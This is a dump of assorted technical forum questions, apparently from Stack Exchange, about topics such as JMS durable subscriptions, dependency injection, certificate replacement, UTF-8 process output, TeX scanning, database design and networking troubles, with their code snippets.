We have several JBoss instances running on a network, and occassionally have to restart JBoss instances that are acting as JMS clients (using durable subscriptions). The problem is that the clients are not disconnecting properly, so when they try to connect, we get a message saying that they are already subscribed. This usually means that we have to stop the JBoss instance that is running as the JMS server, and clear out database tables used for JMS. Then we can restart the server, and the clients can connect to it again. Has anyone run into this problem? Any suggestions? Thanks in advance.",[],False

Mostly users just use online services but there are a couple desktop applications they need and at each site there is a common network share of files that they access. Up till now I have not setup a server (except for the common shared folder on one regular win7 computer at each site). I create an Admin and GeneralUser account on each computer since we don't have any need to give each user an account. So far this has worked alright. They login have a network share, go online and that's most of what they need. We will be opening more sites and more computers. Therefore the basic setup/configuration stuff is getting too much to do on each computer (Setting up user accounts on each computer, installing software such as chrome on each computer, setting the default home page in the browsers, mapping a network drive, etc.) My question: What is a good approach to managing this?

I used quicktabs in the center content area to create a tabbed look for placing links within the body. Everything is working fine. However, when I view the site in IE8 at a resolution if 1024*768, I have trouble with a few links. It seems that sometimes the first link under my buttons are difficult to click. The link is there - I can actually click it, but it is very difficult to locate - it only appears at the very beginning of the link text - it is not the first letter, it seems to be only the first pixel. I looked at the source and everything seems to be correct - I can't figure out what could be wrong. Has anyone seen any similar behavior that might be able to point me in the right direction for a fix for this? Thanks for any thoughts. Edit - I looked further into it and I think it has something to do with my CSS. I disabled css in ie8, and every link is clickable, even the ones that were difficult to locate earlier. I guess there must be an overlapping of containers or something, so I will have to start messing around with those files.",[],False

On the other hand, if I create classes for each role; then (1) a role does not feel like an object, because (at least in my case) a role does not have attributes but only method(s). Consequently, role_A_1 is no different than role_A_2. But for each person I'll have to create a new role object---even if they both share the same role.

In order not to have to do every single registration explicitly, I first use and then only take care of those that need to be specially configured. I have an interface called that has a few different implementations, several of which are in use, but some aren't anymore (as I'm trying to work SOLIDly and adhere to OCP, I am usually not changing them if I need different functionality, but rather leave them alone and create new ones that do what I need now). For that reason I need to overwrite the automatic registration for the interface, in two ways: One implementation is to be injected into my main logic and acts as a decorator for a few of the others. I naturally want this to be registered via and be done with it as this is the implementation my application's functionality currently depends on. Those other implementations are the ""inner"" populators only to be used within that decorator class. To inject them, there are two ways: Explicitly wiring up the constructor for the outer implementation with the specific types; this is not very nice, also because that constructor would have to take the exact number of inner populators I am using right now, which is not OCP compliant. Have the outer implementation take an ; this is what I'd like to do, but it's also where I'm stuck. I can't let Autofac resolve that on its own, because it would just resolve all implementations of the interface, even those that I'm not using anymore as well as the ""outer"" that I don't want in there (and which would probably cause an endless loop during resolution).

272934,"exchange 2003 + outlook 2010, replaced expired cert, but still being used?","Our wildcard certificate expired recently. As such we replaced it. I've replaced the certificate used by IIS and so far as I can tell every guide I've found regarding Exchange 2003 advises that all you need to do is replace the IIS certificate. This was a few weeks ago. After replacing it I tried OWA and Outlook and have not seen any certificate issues, until recently. One of our employees is using his own laptop to connect to our exchange server so he can be portable while doing work, but he is in the office often. As such the system is not on the domain, however his Outlook still can authenticate for his mailbox. He is running Outlook 2010, but our official environment is for 2003 right now. He recently added a shared mailbox which he should have legitimate access too. On the desktop he was using the mailbox would populate, but on his laptop it does not. Furthermore when he tries to repair the account in Outlook it complains about the expired cert that I replaced. This makes me think that the expired cert is still active somewhere on the server, but I cannot conclusively determine where. This laptop was setup after we put our wildcard cert in so I don't think it's holding onto stale data. So far as I know we are not using self-signed certs, so I don't think the local certificate authority is relevant. What am I missing?",[],False

279589,Force StandardOutputEncoding to UTF8,"I'm looking to parse UTF8 characters from the standard output stream of another application in my C# project. Using the default approach, characters outside of the ANSI spectrum are corrupted when read from the process' standard output stream. Now according to Microsoft, what I need to do is set the StandardOutputEncoding: If the value of the StandardOutputEncoding property is Nothing, the process uses the default standard output encoding for the standard output. The StandardOutputEncoding property must be set before the process is started. Setting this property does not guarantee that the process will use the specified encoding. The application should be tested to determine which encodings the process supports. However, try as I might to set StandardOutputEncoding to UTF8/CP65001 the output as read, when dumped to a binary file, shows the same castration of foreign language characters. They are always read as '?' (aka 0x3F) instead of what they're supposed to be. I know the assumption at this point would be that the application whose output I'm parsing is simply not sending UTF8 output, but this is definitely not the case as when I attempt to dump the output of the application to a file from the commandline after forcing the codepage of the commandprompt to 65001, everything looks fine. By this, I know for a fact that the application slave.txt is capable of spitting out UTF8-encoded standard output, but try as I might, I'm unable to get StandardOutputEncoding to do the same in my C# application. Each and every time I end up dealing with encoding in .NET, I wish I were back in the C++ world were everything required more work but was so much more transparent. I'm contemplating writing a C application to read the output of slave.txt into a UTF8-encoded text file ready for C# parsing, but I'm holding off on that approach for now.",['chcp 65001 &amp;&amp; slave.exe &gt; file.txt\n'],False

For instance, if I want to process text up to the next , I can just write But suppose that might not be present, in which case should terminate processing instead. Is there a way to write a command such that sets to and leaves in the input stream, and sets to and leaves nothing in the input stream? should take precedence over , so that sets to and leaves in the input stream. Furthermore, since my goal is to pre-process the text and then use it, I need to know which of or was selected. What I've tried I had the idea to scan tokens one at a time, saving the scanned ones in a token register for later processing, and stop scanning when I saw either end token, but I couldn't get it to work. I wrote some simpler code which uses to pick characters out of the input, checking for a single terminator, and adding to a token register along the way, but this doesn't work because control sequences don't expand. The code is the following: This looks good, and seems to work when you run it, but it doesn't quite when you look at the output: Once you think about it (and read the right parts of The TeXbook and the right TeX.SE questions), this makes a frustrating sort of sense; if we have and , then how could we possibly we tell that ought to ""expand"" into but ought to ""expand"" into ? But unfortunately, I don't see a way to write a which only absorbs one token from the input stream. If took arbitrary balanced text, I could probably work with that, but instead requires a braced group, and otherwise parses things as being part of the argument specification. Also, this command isn't processing the spaces, but that's small potatoes in comparison. The motivation I'm trying to write a command which processes the first line of an -like environment. This command needs to: Absorb tokens up until the first . Process those tokens (that is, count ampersands to determine the number of columns). Place those tokens back in the input stream, preceded by the computed information (that is, the number of columns). However, the delimiter might not be present if the environment is only one line long; in that case, I'd need to instead process the whole environment, up through (and all the rest is the same). But at the start of an environment, I can't know which of these two situations is the case, and so I want to scan ahead to the next or the (thus motivating the question).","['\\A', '\\def\\CmdA#1\\A{...}\n', '\\A', '\\B', '\\def\\CmdAB#1[\\A|\\B]{...} % Nonsense syntax\n', '\\CmdAB\\first\\A\\second\\B\n', '#1', '\\first', '\\second\\B', '\\CmdAB\\only\\B\n', '#1', '\\only', '\\A', '\\B', '\\CmdAB\\other\\B\\order\\A\\after\\B\n', '#1', '\\other\\B\\order', '\\after\\B', '\\A', '\\B', '\\let', '\\let', '\\newtoks\\ScanToks\n\\newcommand*{\\AddTok}[1]{\\ScanToks\\expandafter{\\the\\ScanToks#1}}\n\n\\newcommand*{\\QScan}{\\QScan}\n\\newcommand*{\\Scan}{\\afterassignment\\DoScan\\let\\Scanned=}\n\\newcommand*{\\DoScan}{%\n  \\ifx\\Scanned\\QScan\\else\n    \\expandafter\\AddTok\\Scanned\n    \\expandafter\\Scan\n  \\fi\n}\n', '*\\Scan 1 2 3 \\QScan\n\n*\\showthe\\ScanToks\n&gt; \\Scanned \\Scanned \\Scanned .\n', '\\let\\a=1', '\\let\\b=\\a', '\\a', '1', '\\b', '\\a', '\\def', '\\def', '\\def', '\\Scan', 'align', '\\\\', '\\\\', '\\end{EnvName}', '\\\\', '\\end{EnvName}']",False

605012,Crash when using ReadDirectoryChangesW,"This is a part of an open source project called JNotify. I am trying to fix the Win32 Implementation and it's really driving me nuts. I already read everything there is to read in MSDN about this, and read every web post about this sucky API. I am trying to receive file system notifications on windows using ReadDirectoryChangesW, using a completion port. the behavior I am seeing is that normally it works, but some times the buffer I receive when GetQueuedCompletionStatus returns is corrupted in strange ways. eitehr FILE_NOTIFY_INFORMATION.NextEntryOffset points to the itself (resulting in an endless loop), or something else goes wrong and I receive a bogus file name length. This only happens if I re-watch the directory, never in the first event (but re-watching is required otherwise you only get one event for that directory). The test code that crashes every thing is trivial, it just watch many dirs and creates 2 files in each directory. here is some relevant code, I can add all of it if you want (the whole thing is not too big), but feels too big for a question here. This bit of code creates the completion port, it only runs once - and then I use this completion port for all directories. This is the WatchData constructor, that actually opens the directory handle and associates it with the completion port. This is the code running (inside a WatchData object) when I start watching a directory: This is the main loop that run in it's own thread, handling completion events.

In other words, the more information about what code is doing is located right in front of your eyes, the better a job you’ll do at finding the mistakes. When you have code that says For me, collocation isn't just about the code itself, but the tool used to view the code. If it can help with the 'collocation factor' (term coined by me?)

I was loading it it like so: Now I'm trying to make it so that users can configure the application themselves by writing a configuration file in /etc or /home or whatever, so I made a new file in the same location called config-test.xml: The file /etc/myconf/myconfig.xml does not exist, but that's the whole point of making it optional. I've tried a few different approaches to loading my configuration, including how the documentation does it: http://commons.apache.org/configuration/userguide/howto_configurationbuilder.html. What I have currently is the following: When I run my integration tests, I see no Yay, I see no Herp and I see no Derp. If I place a before I try to load things, it does print so is being called. The output I get from commons configuration amounts to: Those initialize methods are just calling and then trying to get data from the configuration that is loaded.

Edit #2: I looked through my output a bit more and buried in the complaints from commons I found that it seemed to load the correct file eventually. I think I may have it working?

The problem: The engine's developer strongly urges extending from the existing template projects bundled with the engine, but the engine's Info.plist files are Mac OSX project Info.plist files. This is an iPhone engine, and so I cannot understand why the Info.plist file is structured to take keys for Mac OS apps, but that's how it is. I did a FileMerge comparison to ensure there was nothing within the file itself that defined its use for one OS or the other, so I guess it's defined somewhere in the project settings. Edit - Opening the plist file in Xcode or Property List Editor and then trying to add a key such as ""Icon already includes gloss and bevel effects"" will not work in this iPhone project because it is not in the list. However, ""Cocoa Java Application"" and others are available!",[],False

794469,Communicating a string of zeros and ones quantumly,"Alice wants to communicate an arbitrary $x \in \{0 ,1\}^n$ to Bob. Alice and Bob communicate in rounds, in each round Alice (or Bob) applies a unitary transformation on his/her part and transmits a qubit to the other side, until at the end Bob measures his state and tries to infer x. The protocol is successful if for every $x \in \{0,1\}^n$ Bob succeeds with probability 1. Let $n_A / n_B$ be the number of messages sent by Alice / Bob respectively. Now I want to show that for any successful protocol we must have $n_A \geq \lceil n/2 \rceil $, and $n_A+n_B \geq n$, and I need to show that the same argument above follows also for p-successful protocols, i.e if there's a p-successful protocol then the ineqaulities above should also follow for this protocol; a p-successful protocol is one in which Bob succeeds with probability p.

Essentially, you start at $+\infty$ and walk down the positive integers, writing down every number which is smaller than all numbers you encountered first. (Alternately you could write down the ones which are larger, but either way the important point is that you walk down from infinity rather than up from 1.)

I need to determine the names and data types of each of the columns of the returned result of the statment from within C#.

By ""better"" I mean either a less resource-intensive way of accomplishing the same task or a more sure way of accomplishing the same task (i.e. for all I know the code snippet I just gave will fail in some situations). SOLUTION: First of all, my hack is bad, namely for something like this: SELECT TOP 0 * FROM (SELECT 0 AS A, 1 AS A) S In other words, in a sub-select, if two things are aliased to the same name, that throws an error. So it is out of the picture. However, for completeness sake, I went ahead and tested it, along with the two proposed solutions: and .

957499,Identifying Hard Drive as performance bottleneck for desktop machines,"I'm working in a development team where we all use laptops so we can work in multiple locations. These laptops are proving notoriously slow for development work, but at a glance they all look to have the specification for a much faster experience: CPU - Intel Core 2 Duo T7500 Memory - 2GB of RAM We all experience the biggest delays when the hard-drives are being accessed, particularly when swap-files are being thrashed. After doing a little bit of profile, a colleague discovered that our HDDs are seeing Read/Write speeds of about 10MB/sec. This seems abnormally low and we believe it the cause of the problem. Sensibly (though somewhat annoyingly) our business wont blow money on faster drives just to see if it fixes the problem; we need to illustrate this is definitely the problem and that buying some solid-state drives will make it go away. I need some way of showing how 90% of the system resources aren't being used over the course of a day, and that whenever there is utilization, it's all in HDD reads or writes. Are there any tools I could use to provide this information? Does it seem likely the problem is going to be fixed by a faster drive? Should I be looking for alternatives?",[],False

958239,Is there a way to check for Duplicates when Importing Excel Sheet into MySQL table using vb.net,I have a upload excel file on my web application. When the file is uploaded it is supposed to be openned and then import the data into a mysql table. It works fine in that it adds the information just fine. However there is a problem the code I cannot get the duplicate checking to work correctly.. Part of this is because the excel sheet that will be used does not have any column that I can use as a unique identifier. Several times in the excel sheet the information is completely identical across the entire row with only differences in one or two columns... I was thinking I could do something like: Select * FROM table_name WHERE table_col_1 = variable and table_col_2 = variable 2 and etc... I am thinking by doing this I could compare the values of every column in the row to the import value and if its the same it would skip it... However I cant quite get my head around it...

In particular, I'm looking to avoid the obvious (inefficient) implementation of basically just creating a and calling and —both O(N) operations—for every element. Update: Let's say the ""sequence"" of operations is in fact a concrete collection whose count is known and which is randomly accessible by index (so, like a , for example). Let's also say the actual count of the resulting collection is already known (but really, that would be trivial to figure out in O(N) anyway, by counting insertions and removals).

1014006,StructureMap returns a disposed nHibenrate session object from thread local scope,"[OR] How to define a StructureMap life cycle for UoW to be consumed by http requests and quartz jobs I have this web application which uses SM for IoC. I am using HybridHttpOrThreadLocalScoped scope to store my nHibernate ISession objects. This works ok in a session per request fashion for my web requests. But I also have quartz.net that schedules couple of jobs. The job uses the same unit of work to get the ISession object. In this scenario when the scheduler start the job, everything works fine at first and the job runs fine for couple of times UNTIL the job thread id gets repeated. Imagine that when the job is scheduled it start to run in threads with ids 11, 12, 13, and then with thread id 11 again. At this point structuremap returns a session object which is already disposed and I get ""System.ObjectDisposedException: Session is closed!"" error. So from what I can see, the session is kept in thread local storage and after I dispose the session at the end of my unit of work, the session object is still kept in the thread local storage. It seems that after the thread terminates its local storage is not cleared and somehow when a new thread with the same id is created, structuremap looks up the session in the old thread local storage (which is supposed to be cleared for the new thread I believe) and returns the session object which is already disposed. Questions: Is there a way to clear the thread local storage (on termination)? Is there an equivalent of ""ReleaseAndDisposeAllHttpScopedObjects"" for thread-scoped objects? Is there a way to nullify (or eject) the disposed object so even if SM looks for it then it wouldn't find any and has to create a new instance? I hope I made my question clear. This has taken couple of hours of my time and still I haven't found a way around it. I appreciate any hint Update: I added my own solution to make a UoW served by StructureMap work with both http requests and quartz jobs.

I have a structure similar to the sunburst (but with a single layer, sort of a pie chart with a hole in the middle). By clicking the arrow on keyboard the data visualized changes and so it does the sunburst. In particular changes the innerRadius depending on a particular property of the data and some elements are added, deleted and updated. I cannot manage to transition correctly from one to another sunburst. The transition is almost ok apart from the update of existing element. For example suppose I have common elements in the two following pieces of data to visualize such as [{'name': 'A', 'value': 100}, {'name': 'B', 'value': 100}, {'name': 'C', 'value': 100}] and [{'name': 'A', 'value': 300}, {'name': 'D', 'value': 200}]. In the above example I'd like that the arc corresponding to the element A is updated smoothly as it is on the Sunburst example on d3 website, the B and C elements disappear (and I managed to do that) and the D elements appears smoothly such as a growing arc, or something like that.

Each command can change members of other classes of the game (like the command ""speed 5"" changes the variable in by calling ) and also gives an output back to the console about the result. There are also commands that do more ""behind the scenes"" than only changing a variable, this should also be done by Lua and only the final result passed back to the C++ code (console output + changed variables in the correct class). Where/how/with what should I start to convert the code behind this console command functions to Lua? Like this: User enters ""speed 5"" in the console, then Lua calls and then Lua reports back to the C++ console. Instead of hard-coding the code behind the commands they should be written in Lua, but the whole rest of the game should stay in C++ (like my classes and there members and the console framework).

Personally I do not consider this a desirable solution. What I want is when the session times out, all subsequent requests to any non-public page needs to be directed to index.xhtml. References to pages that don't require login should go through with a new session object.

1332579,Checking Proof: Given $\boldsymbol{x}$ there exists a $\boldsymbol{y}$ where $\boldsymbol{x} \cdot \boldsymbol{y} = 0 $,"Let bold type-face denote a k-tuple in $\mathbb{R}^k$ Proposition: Suppose there is a, $\boldsymbol{x} \in \mathbb{R}^k$ where $k\ge2$. Then there exists a $\boldsymbol{y} \in \mathbb{R}^k$ where $\boldsymbol{y} \ne \boldsymbol{0}$ such that $\boldsymbol{x} \cdot \boldsymbol{y} = 0 $ Proof: Suppose $k=2$, then $\boldsymbol{x} \cdot \boldsymbol{y} = \sum_{i=1}^2 x_iy_i=x_1y_1+x_2y_2$. Thus, by allowing $y_1=\dfrac{1}{x_1}$ and $y_2 = \dfrac{1}{-x_2}$ the expression goes to zero. Thus there is at least one $\boldsymbol{y}$ that satisfies the expression. Suppose that the proposition is true for $k=n$, then it must also be true for $k=n+1$. Suppose $k=n+1$, then $\boldsymbol{x} \cdot \boldsymbol{y} = \sum_{i=1}^{n+1} x_iy_i = \sum_{i=1}^{n} x_iy_i+x_{n+1}y_{n+1}$. Based upon the inductive assumption, the first $n$ values of $\boldsymbol{y}$ can be set such that $\sum_{i=1}^{n} x_iy_i=0$ where $y_i \ne 0$ for at least one $i=1,2,...,n$. Set $y_{n+1}$ to zero, thus, the whole expression is zero and there is at least one $\boldsymbol{y} \ne \boldsymbol{0}$ where $\boldsymbol{x} \cdot \boldsymbol{y} = 0$ $\square$ Question: I would like to request some feedback on my proof.

1515001,What is the best database schema for an availability calendar that allows scheduling appointments(reoccurring and single)),"In my application I have a provider that has a schedule and clients that book appointment from the schedule. I need the following features. Provider: - Be able to specify reoccurring availability. For example Mon 9-5, Tues 10-3, etc. - Be able to black out datas. For example - not available on this Mon. - Be able to add single, not reoccurring dates/times slots. For example - This Sat 9-5. Customer: - Be able to book single appointments. - Be able to book reoccurring appointments. (Every Mon 9-4). So far I came up with 3 options: Divide the schedule into 30 min intervals and create a database entry for each interval/provider pair. Each interval can be either free or booked. When a customer books an appointment we mark the intervals as booked. The problem with this approach is that it wastes a lot of space, and I am not sure how good the search performance would be for a reoccurring booking. Save each availability period as an ""event"". If it is reoccurring, duplicate the event. When searching for free slots search the booking table to make sure that there is no over lapping booking. In this case, searching for reoccurring slots seems a bit awkward. To find all the providers that are available on Mon 9-5 for the next year we will have to search for all the matching 'events' and find all the providers that have 52 matched events. Save each availability period as an ""event"". Add a flag if it is reoccurring.When searching for free slots search the booking table to make sure that there is no over lapping booking. It makes it easier to search for reoccurring appointments. To ""black out"" slot that are suppose to be reoccurring we can just insert a fake booking.",[],False

We are having issues with the DB Server for our web application where queries that should (and usually do) run in a very short time (&lt; 10ms) are, on random occasions, taking anywhere between 1 ~ 30 seconds to execute - with no obvious pattern. According to our profiler traces, some of them are even ""do-nothing"" queries, such as (usually runs in 0ms; observed peaks of 3~6s), and , etc. Some examples are: Where has about 500,000 rows in 5 columns. Has a surrogate primary key, and an index on . Usually takes 0.97ms, peaks at 11s. Table is NEVER written to (was pre-populated prior to go-live). Profiler records it as taking 0-15 CPU, 18-25 Reads, 0-1 Writes (no idea why the write). Where has about 30,000 rows over about 10 columns (one of which is an Xml column). is the clustered primary key. Table is regularly written to and read from. Usually takes 10~20ms, peaks at 26s. Profiler records it as taking 0 CPU, 15-36 Reads, 0-1 Writes. Where has about 1,000,000 rows in it over about 8 columns. Has a surrogate primary key (identity), and an index on . Table is regularly written to, but rarely read from (only by us directly from SSMS). Usually takes 15~150ms, peaks at 5s. I don't have the profile record for it at hand, but from memory, CPU is around 0, Reads and writes were between 0 and 100 each. The setup we're using is a mirrored setup with a Dell 2950 as the principle (2 4-core xeon 2.6, 16Gb RAM), and a Dell 6850 as the mirror (4 HT Xeon 3.2, 8Gb RAM). Both running SQL 2005 SP4 64-bit. The database in question is not particularly large, around 16Gb in size. The primary has 6 SAS disks divided into 3 RAID-1 volumes; one for System + Page + TempDB, one for the database's MDF, and one for the transaction log + hourly log backup + daily DB backup. I know the log situation is far from the best - in terms of disk IO (see below), and data security. So far, we think we've eliminated: The mirror. We separated the servers, and ran using one of them (and then switched to the other), but the performance issues remained. Blocking due to locks(*). is never written to and, by my reckoning, should never have an exclusive lock on it. Additionally, we've checked through the traces and on many occasions the ""problem query"" is the only one running - the only other activity is other connections disconnecting Poor indexing. With the low figures for Reads and CPU, it would suggest that SQL Server is using indexes effectively. Disk IO. PerfMon indicates some odd figures for the data file drive (but only that drive) - whilst data read/ write rates rarely seem to exceed 32KB/s, the Current Disk Queue Length spikes to around 215 for durations of 2-5 seconds at approximately 45-60minute intervals with no fixed pattern. However, these do not correlate with times of poor query performance. The disk queue lengths for the other two drives [system + page + tempdb] and [log + backups] never exceeds 3. (*) We've tried getting profiler to capture events related to lock acquisition, but the trace bloats to unreadable proportions and, worse, the web application grinds to a halt.

For instance, we might not just add a record to the DB but also change properties of another record, increase some counts, take something back, etc. We need to put that additional code somewehere and he puts it in those services. For instance, he has a CustomerService that manipulates Customers. This requires us to send ISession instance to the CustomerService, so that the CustomerService can use it to access the datastore. Now another way of doing it would be to put that additional code in the Customer class itself and send the ISession (or IRepository, whatever terminology we use) to that class. And not have any services. Typically, Customer, Order, Product, etc. classes are Model classes, so that would result in big/heavy model classes. My question is, which solution is better?

I have a requirement to use it for a very basic CMS which will consist of ~ 10 pages, most of which will be static content, updated periodically. I'm going to need to ability to upload documents, embed images, edit copy using the text editor - pretty much all of the standard features wordpress offers. However, I'm having difficulty surrounding the issue of editing specific sections within a page - in particular, just knowing where to begin. A 'normal' CMS would traditionally break a page into separate sections and allow me to edit any of those sections, either by directly editing the content, or by including shared content in that spot. I cannot find out how to do this using wordpress. Is it possible to 'stretch' the Page model so that a Page is actually just a chunk of content, it gets included by a specific page/template, and it's - somehow - protected from being viewed directly (removing it from navigation menus being a start). Any pointers on where to begin? Update To clarify, imagine a standard wordpress blog post. Pretend it's a static piece of content. Suppose you wanted an editor to be able to change just the first paragraph of that blog post. Now, should the static content on that page be in a Post, Page, Template, or something else? should the editable content be a Page, ... or something else? For example: If I want that paragraph to be editable, presumably I need something like: Update 2 OK, after a lot of research, trial, and error, I've included the following: Wordpress is not set up to easily replicate a classic CMS, particularly with regard to having several pieces of content on one page. This model can be imitated, more or less, using custom posts (see below) Pages very nearly offer the ability to do this, however: A plugin is required just to include a page Pages don't seem to be as flexible as posts - e.g. no custom page types The method I've used, using custom post types, is broadly as follows: The page is a 'Page' with a custom template - call it 'mypage.php' That template contains the following: 'image')); get_template_part('image'); ?&gt; &lt;/div&gt; Does that make sense to anyone out there? :-)","['&lt;h1&gt;About us&lt;/h1&gt;\n\n&lt;p&gt;Example.com is a company specialising in examples, demonstrations,\nand canonical stuff.&lt;/p&gt;\n', ""&lt;h1&gt;About us&lt;/h1&gt;\n\n&lt;p&gt;&lt;?php insert_page('name-of-content-chunk'); ?&gt;&lt;/p&gt;\n""]",False

I replace a value object for a new one, then nhibernate inserts the new value and orphan the old one, then deletes it. Ok, that's a problem. Insured is my entity in my domain. He has a collection of Addresses (value objects). One of the addresses is the MailingAddress. When we want to update the mailing address, let's say zipcode was wrong, following Mr. Evans doctrine, we must replace the old object for a new one since it's immutable (a value object right?). But we don't want to delete the row thou, because that address's PK is a FK in a MailingHistory table. So, following Mr. Evans doctrine, we are pretty much screwed here. Unless i make my addressses Entities, so i don't have to ""replace"" it, and simply update its zipcode member, like the old good days. What would you suggest me in this case? The way i see it, ValueObjects are only useful when you want to encapsulate a group of database table's columns (component in nhibernate). Everything that has a persistence id in the database, is better off to make it an Entity (not necessarily an aggregate root) so you can update its members without recreating the whole object graph, specially if that's a deep-nested object. Do you concur? Is it allowed by Mr. Evans to have a mutable value object? Or is a mutable value object a candidate for an Entity? Thanks",[],False

1741472,Stop List From Scrolling,I have a datagrid that's using a custom itemrender with a button in it. I have a problem whereby when I click on a button the datagrid list scrolls its self. How can I prevent this behaviour? Extended datagrid Item Renderer Update I removed my mouse down handler from the datagrid and removed the cusom component. Clicking on a item in the datagrid makes the datagrid scroll so that the item selected appears first in the list. This is the behaviour I need to stop.,"['&lt;mx:DataGrid xmlns:mx=""http://www.adobe.com/2006/mxml""\n             doubleClickEnabled=""false""\n             alternatingItemColors=""[#ffffff,

1832400,PHP Web Application: mysql database design best practices question,"I am currently in a debate with a coworker about the best practices concerning the database design of a PHP web application we're creating. The application is designed for businesses, and each company that signs up will have multiple users using the application. My design methodology is to create a new database for every company that signs up. This way everything is sand-boxed, modular, and small. My coworkers philosophy is to put everyone into one database. His argument is that if we have 1000+ companies sign up, we wind up with 1000+ databases to deal with. Not to mention the mess that doing Business Intelligence becomes. For the sake of example, assume that the application is an order entry system. With separate databases, table size can remain manageable even if each company is doing 100+ orders a day. In a single-bucket application, tables can get very big very quickly. Is there a best practice for this? I tried hunting around the web, but haven't had much success.

We license SAS on our server instead of our desktops, so furthermore we have to launch a remote desktop application to execute code. I was able to use a Telnet connection instead to remotely connect to the server, and batch execute SAS programs. Then I was interested in whether a python script could be made to connect remotely, and batch execute code, and this script could be executed in jEdit as a BeanShell script. So far, I have Python code which successfully opens and closes the Telnet connection. It can do basic shell functions like call ""dir"". However, when I pass the exact same line that I use to execute SAS from command prompt on the remote server with a telnet connection in Python, nothing happens. Is it possible the server is preventing me from executing code from a script? I use a ""read_until"" statement for the prompt before running any code.",[],False
1956941,Likely reason for not being able to power on an older computer?,"I demoted my older desktop computer to a server a short while back and it has always had some sort of problem with powering on after a complete power loss. For instance, right now it's powered on and running fine. If I power it off, I can easily power it back on without any problems. However, if I power it off, and then disconnect the power chord, then reconnect and attempt to power it on, anything short of a prayer and a miracle will not make it power on, and I have to keep trying for what seems like ages to get it to power on. One thing that seems to increase its chance to power on is to disconnect everything except the power chord. USB cables (even for mouse and keyboard), monitor cable, network cable, etc. everything has to go. Also, the longer I just let the machine sit there, connected to power, but powered off, with nothing else connected, seems to increase the chance of it powering on. What likely items in the machine can be the problem? I'm assuming it's a problem with the power unit, that it can't manage to deliver enough juice to the rest of the system when everything is connected and probably drawing minute quantities of power from it, but what about the fact that it seems to be easier to power it on the morning after I reconnect the power to it than the same evening? Is there something in there that needs to recharge? This machine is usually left on 24/7 for home server purposes so it hasn't niggled me all that much, but a couple of nights ago there was a big thunderstorm in the area so I disconnected everything, and I had to reconnect it one day and power it on the next day to get it back in order. Has anyone else seen this kind of behaviour? I'm loath to begin replacing elements in it since the problem doesn't come up all that often, and I'd hate to start replacing the power unit only to find out that this is a typical problem with the thingamajig connected to whatsitsname on the motherboard.",[],False

2004730,Connection/pinging from/to WLAN,"Sorry for the vague title, I'm finding it hard to describe the problem accurately in a few words (but that's probably because of me, English is not my native language). I'm trying to send a file from one computer to another via TCP. My server/reciever is directly connected to the internet (at least, that's what I suppose, I'm hiring this room and the internet is included, I have no idea about the set-up, it's really plug-and-play for me), the other one is connected to a WLAN (from the wireless router of one of my housemates, so my housemates also have acces to this network). The first three bytes from the IP-adresses are the same (I checked via whatsmyip.com). I send and recieve in a blocking way (so non-asynchronous). When I try to send a short message, the sender/client crashes with a timeout error. I then tried to ping the other IP adress, but this one times out too! Even more surprising (to me, at least) was that the ping the other way around works fine (so from the machine that is directly connected to the internet, to the machine that is connected to the WLAN). If anything, I would expect it the other way around (because I understood that it could be a bit of trouble to connect to anything behind a firewall/router). machine on WLAN works fine. As you may have understood (by analyzing my usage of terms), I really have no clue about networks. I followed a course (I'm a computer science student) two years ago (half of it was on computer architecture, and half of it on networking). I've always used existing networks (my dad used to handle that when I lived at home, and now the organization where I'm hiring from). Could anyone explain to me what is going on, and possibly help me with it? (I didn't provide my source for the send and recieve programs, because I think that once I understand what is going on I am able to fix it myself). Greetings and thanks in advance to anyone who takes the time to help me! :)",[],False

Request: Can you help make this one-liner more effective, faster, or efficient? How about more elegant? If you understand what I did there then please read on. The problem is that it can be difficult to quickly discern what directories contained under the ""/"" directory are contributing to ""/"" filesystem capaciy because all other filesystems fall under root. This will exclude all non / filesystems when running du on Solaris 10 or Red Hat el5 by basically munging an egrepped df from a second pipe-delimited egrep regex subshell exclusion that is naturally further excluded upon by a third egrep in what I would like to refer to as ""the whale."" The munge-fest frantically escalates into some xargs du recycling where du -x/-d is actually useful (see bottom comments), and a final, gratuitous egrep spits out a list of relevant, high-capacity directories that are exclusively contained within the ""/"" filesystem, but not within other mounted filesystems. It is very sloppy.

2099639,Validate data binding in XAML in compile time,"I’m working on WPF based application. Environment is VS2008 SP1 with .NET 3.5 SP 1. In our development we are using MVVM pattern widely. I.e. application developers write Models and ViewModels (C#), then UI developers will write Views using WPF Binding (XAML). Application developers also write unit tests on top of ViewModels. We are using Continuous Integration methodology and we are diond build and executing unit test on each modification The problem is a lack of process or tools of data binding correctness validation in XAML. For example: App developer writes property NmberOfApples and unit tests to check its correct behavior UI developer creates user control and bind it to the property App developer finds that property has misspelling and fix its name to NumberOfApples It would be compilation time errors in any C# code uses NmberOfApples property, and such errors will be easy to catch (Continuous Integration) Data binding in XAML files are not going to be validated and it will be run time error My question will be “Is there any tool or methodology that help us validate data binding correctness in XAML in compile time?”",[],False

However, I found that it is very hard to keep this practice in Java. When we write java code, we write a function in a class, it requires us to do some indentation already, let alone to add a few if-else statement inside the function. Apart from that, we always keep call functions in a object. Such kind of behavior make that it is hard to make 80 characters per line. Wrapping the line is a method, but it decrease the readability of the code. I am not a pro. java programmer. Would you still follow this rule when writing Java? or is there common practice on the indentation of java? Thanks.",[],False
2148161,How to store smart-list rules in a relational database,"The system I'm building has smart groups. By smart groups, I mean groups that update automatically based on these rules: Include all people that are associated with a given client. Include all people that are associated with a given client and have these occupations. Include a specific person (i.e., by ID) Each smart groups can combine any number of these rules. So, for example, a specific smart list might have these specific rules: Include all people that are associated with client 1 Include all people that are associated with client 5 Include person 6 Include all people associated with client 10, and who have occupations 2, 6, and 9 These rules are OR'ed together to form the group. I'm trying to think about how to best store this in the database given that, in addition to supporting these rules, I'd like to be able to add other rules in the future without too much pain. The solution I have in mind is to have a separate model for each rule type. The model would have a method on it that returns a queryset that can be combined with other rules' querysets to, ultimately, come up with a list of people. The one downside of this that I can see is that each rule would have its own database table. Should I be concerned about this? Is there, perhaps, a better way to store this information?",[],False

